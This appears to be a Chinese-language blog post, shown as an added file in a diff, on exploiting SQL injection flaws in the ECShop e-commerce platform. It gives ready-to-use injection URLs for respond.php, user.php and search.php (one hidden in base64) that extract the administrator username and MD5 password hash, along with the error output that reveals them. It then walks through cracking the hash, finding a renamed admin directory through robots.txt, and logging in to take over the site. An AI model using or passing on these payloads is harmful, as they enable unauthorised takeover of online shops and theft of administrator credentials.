@@ -1,0 +1,69 @@
+ecshop漏洞测试后台账号密码悲剧中
+时间:11-10-29 栏目:网站建设 作者:isCheck 评论:0 点击: 13 次 
+.本文标签： ecshop
+
+今天做项目,觉的ecshop应该有漏洞就是没关心过,呵呵google一下,"echsop注入漏洞"
+
+果然一大片.找了几篇看上去是原创的不是采集抄袭的文章研究了一下
+
+找到一篇关于注入的漏洞,呵呵挺狂的直接爆管理员用户名密码.废话不说代码贴上来
+
+ 
+
+http://www.xxxxx.com/respond.php?code=tenpay&attach=voucher&sp_billno
+
+=1%20and%201=2%20union%20select%201%20and%20%28select
+
+%201%20from%28select%20count%28*%29,concat%28%28Selec
+
+t%20concat%280x5b,user_name,0x3a,password,0x5d%29%20FROM
+
+%20ecs_admin_user%20limit%203,1%29,floor%28rand
+
+%280%29*2%29%29x%20from%20information_schema.
+
+tables%20group%20by %20x%29a%29%20%23
+
+ 
+
+表前缀会在前面的信息里面爆出来,提示错误table不存在看一下前面的提示信息就能猜出表前缀了
+
+好 得到结果爆出用户名和密码
+
+MySQL server error report:Array ( [0] => Array ( [message] => MySQL Query Error ) [1] => Array ( [sql] =>
+
+SELECT log_id FROM `ecs`.`ecs_pay_log` WHERE order_id=1 and 1=2 union select 1 and (select
+
+1 from(select count(*),concat((Select concat(0x5b,user_name,0x3a,password,0x5d) FROM 
+
+ecs_admin_user limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #
+
+AND order_type=1 ) [2] => Array ( [error] => Duplicate entry '[username:pwd]1' for key 1 )
+
+[3] => Array ( [errno] => 1062 ) ) 
+
+方块里面的就是账号和md5的密码,用md5查询破解一个密码,得到了密码
+
+然后登陆网站后台,至于网站后台的路径可能被管理员修改了
+
+但是很多管理员忽略了一点就是robots.txt文档里面他屏蔽了那个目录可能不是admin那么就是他现在的目录
+
+好后台目录找到了,进去输上账号密码就进入了后台了
+
+
+
+用ecshop漏洞，一分钟拿站再不是问题
+
+2011-04-16 
+
+这个时候在其网址后输入病毒代码即可以爆出该站的管理员账户密码
+
+普通代码:"user.php?act=order_query&order_sn=' union select 1，2，3，4，5，6，concat(user_name，0x7c，password，0x7c，email)，8 from ecs_admin_user/*"
+
+而有些网站会针对这个问题作出些修复等等,所以这个普通代码的成功率现在已经不是那么高了.如果普通代码不行,不着急,还有个变种代码
+
+变种代码:"search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319"
+ 
+
+ 
+
